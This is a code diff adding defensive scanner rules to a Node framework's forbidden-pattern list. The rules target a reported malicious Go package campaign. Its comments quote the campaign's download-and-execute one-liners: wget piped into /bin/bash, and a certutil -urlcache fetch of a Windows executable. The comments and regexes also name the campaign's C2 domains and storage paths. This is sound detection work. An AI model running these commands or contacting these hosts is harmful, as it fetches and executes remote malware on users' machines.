@@ -1192,6 +1192,125 @@ const FORBIDDEN_PATTERNS: readonly ForbiddenPattern[] = [
       "remove this literal",
     keepStrings: false,
   },
+  // ---- 11 malicious Go packages / obfuscated-loader campaign
+  //      (Socket 2025-08-06,
+  //      https://socket.dev/blog/11-malicious-go-packages-distribute-obfuscated-remote-payloads) ----
+  //
+  // Socket's Threat Research Team uncovered eleven malicious Go modules
+  // (`github.com/stripedconsu/linker`, `agitatedleopa/stm`,
+  // `expertsandba/opt`, `wetteepee/hcloud-ip-floater`,
+  // `weightycine/replika`, `ordinarymea/tnsr_ids` + `TNSR_IDS`,
+  // `cavernouskina/mcp-go`, `lastnymph/gouid`, `sinfulsky/gouid`,
+  // `briefinitia/gouid` — 8 of which typosquat well-known Go modules)
+  // that share an identical index-based string-array obfuscation
+  // routine. At runtime each package rebuilds a one-liner from a string
+  // table and calls `exec.Command("/bin/sh", "-c", <decoded>)` to
+  // execute one of two shapes:
+  //
+  //   1. Unix:  `wget -O - https://<c2>/storage/de373d0df/a31546bf | /bin/bash &`
+  //      — fetches a Bash second-stage and pipes it straight into
+  //      `bash` without writing to disk, then backgrounds.
+  //   2. Windows: `cmd /C if not exist %UserProfile%\Downloads\appwinx64.exe
+  //      certutil.exe -urlcache -split -f https://<c2>/storage/bbb28ef04/fa31546b
+  //      %UserProfile%\Downloads\appwinx64.exe && start /b ...`
+  //      — uses the LOLBin `certutil.exe` (a signed Microsoft binary)
+  //      to download a PE and execute it silently in the background.
+  //
+  // Seven of ten distinct C2 hosts share the path `storage/de373d0df/a31546bf`,
+  // and the second-stage Windows downloads share `storage/bbb28ef04/fa31546b`.
+  // The C2 hosts cluster on `.icu` / `.tech` / `.fun` TLDs:
+  // `monsoletter.icu`, `nymclassic.tech`, `alturastreet.icu`,
+  // `carvecomi.fun`, `infinityhel.icu`, `kaiaflow.icu`, `kavarecent.icu`.
+  //
+  // `@daloyjs/core` is a Node.js framework, not a Go module, so the
+  // exact malicious packages cannot enter our `node_modules`. But the
+  // *attack class* (index-decoder obfuscation → reconstructed
+  // `"/bin/sh","-c"` + `"wget ... | bash"` one-liner → `exec.Command`)
+  // translates verbatim to a malicious Node package:
+  // `child_process.exec("wget -O - URL | sh")` or, with the existing
+  // `child_process` ban, an aliased-spawn / `eval`-decoded variant
+  // that reconstructs the same shell-string at runtime. The patterns
+  // below add belt-and-braces IOC literals so that even if a future
+  // PR (or a malicious republish of `@daloyjs/core` itself) smuggles
+  // the *decoded* string past the `child_process` and `eval` gates,
+  // the literal shape and the documented C2 hosts/paths are rejected
+  // at the source-text level.
+  {
+    // The documented C2 hosts. Anchored on a DNS-label boundary so
+    // an unrelated host that merely *ends* in `.icu` is not matched
+    // (only these seven specific hosts trip the gate). Word-boundary
+    // start (`\b`) so subdomains like `cdn.monsoletter.icu` are still
+    // caught.
+    re: /\b(?:monsoletter\.icu|nymclassic\.tech|alturastreet\.icu|carvecomi\.fun|infinityhel\.icu|kaiaflow\.icu|kavarecent\.icu)\b/i,
+    reason:
+      "documented C2 host (`monsoletter.icu` / `nymclassic.tech` / `alturastreet.icu` / " +
+      "`carvecomi.fun` / `infinityhel.icu` / `kaiaflow.icu` / `kavarecent.icu`) for the 11 " +
+      "malicious Go packages obfuscated-loader campaign — every one of these resolves to a " +
+      "`/storage/de373d0df/a31546bf` Bash second-stage piped into `/bin/bash`, or to a " +
+      "`/storage/bbb28ef04/fa31546b` Windows PE downloaded via `certutil.exe -urlcache` " +
+      "(https://socket.dev/blog/11-malicious-go-packages-distribute-obfuscated-remote-payloads); " +
+      "any reference in `src/**` is a hard IOC",
+    keepStrings: true,
+  },
+  {
+    // The two shared C2 path signatures. Seven of the ten distinct C2
+    // URLs reuse `storage/de373d0df/a31546bf` (Bash second-stage) and
+    // two reuse `storage/bbb28ef04/fa31546b` (Windows PE). Matching
+    // the path alone catches future C2 rotations onto new hostnames
+    // that keep the same backend path layout — exactly the "rotate
+    // the host, keep the storage path" pattern Socket flagged as the
+    // automation tell of this campaign.
+    re: /\bstorage\/(?:de373d0df\/a31546bf|bbb28ef04\/fa31546b)\b/i,
+    reason:
+      "documented C2 URL-path signature (`/storage/de373d0df/a31546bf` Bash second-stage or " +
+      "`/storage/bbb28ef04/fa31546b` Windows PE) for the 11 malicious Go packages " +
+      "obfuscated-loader campaign; 7 of 10 distinct C2 hosts reuse the first path and 2 reuse " +
+      "the second, so matching the path catches host rotations onto new domains " +
+      "(https://socket.dev/blog/11-malicious-go-packages-distribute-obfuscated-remote-payloads); " +
+      "any reference in `src/**` is a hard IOC",
+    keepStrings: true,
+  },
+  {
+    // The shell-pipe-to-shell TTP itself. The decoded payload from
+    // every one of the 11 packages has the shape
+    // `wget -O - <url> | /bin/bash` (or `curl ... | sh`,
+    // `curl ... | bash`). A backend HTTP framework has zero reason to
+    // ever materialize this primitive as a literal. The pattern is
+    // tight: `wget` or `curl`, then any chars, then a pipe to a shell
+    // binary. Requires at least one whitespace between the downloader
+    // and the URL so identifiers like `curlPipe` or `wgetable` do not
+    // trip it.
+    re: /\b(?:wget|curl)\b[^"'`\n]{0,200}\|\s*(?:\/bin\/)?(?:ba)?sh\b/,
+    reason:
+      "shell-pipe-to-shell download-and-execute one-liner (`wget -O - URL | /bin/bash`, " +
+      "`curl ... | sh`, `curl ... | bash`) — the canonical TTP from the 11 malicious Go " +
+      "packages obfuscated-loader campaign, where each package reconstructs this string from " +
+      "an index-based string array and hands it to `exec.Command(\"/bin/sh\", \"-c\", ...)` " +
+      "(https://socket.dev/blog/11-malicious-go-packages-distribute-obfuscated-remote-payloads); " +
+      "Daloy core never shells out, so any literal of this shape in `src/**` is a hard IOC",
+    keepStrings: true,
+  },
+  {
+    // `certutil.exe -urlcache` is a documented Windows LOLBin: a
+    // signed Microsoft binary repurposed to download arbitrary files
+    // from a URL (`-urlcache -split -f <url> <out>`). It is the
+    // Windows half of the 11-Go-package campaign's loader and is
+    // listed in MITRE ATT&CK as T1218.010 (Signed Binary Proxy
+    // Execution: Certutil). A Node-side backend framework has zero
+    // legitimate reason to ever materialize this command as a
+    // literal — match either `certutil -urlcache`, `certutil.exe
+    // -urlcache`, or the `-urlcache -split -f` flag sequence.
+    re: /\bcertutil(?:\.exe)?\b[^"'`\n]{0,80}-urlcache\b|-urlcache\s+-split\s+-f\b/i,
+    reason:
+      "`certutil.exe -urlcache -split -f` is the documented Windows LOLBin (MITRE T1218.010) " +
+      "used by the Windows half of the 11 malicious Go packages obfuscated-loader campaign to " +
+      "silently download a PE second-stage from `https://<c2>/storage/bbb28ef04/fa31546b` and " +
+      "`start /b` it in the background " +
+      "(https://socket.dev/blog/11-malicious-go-packages-distribute-obfuscated-remote-payloads); " +
+      "Daloy core never shells out to Windows binaries, so any literal of this shape in " +
+      "`src/**` is a hard IOC",
+    keepStrings: true,
+  },
 ];
 
 const STRING_LITERAL_RE = /"(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'|`(?:\\.|[^`\\])*`/g;
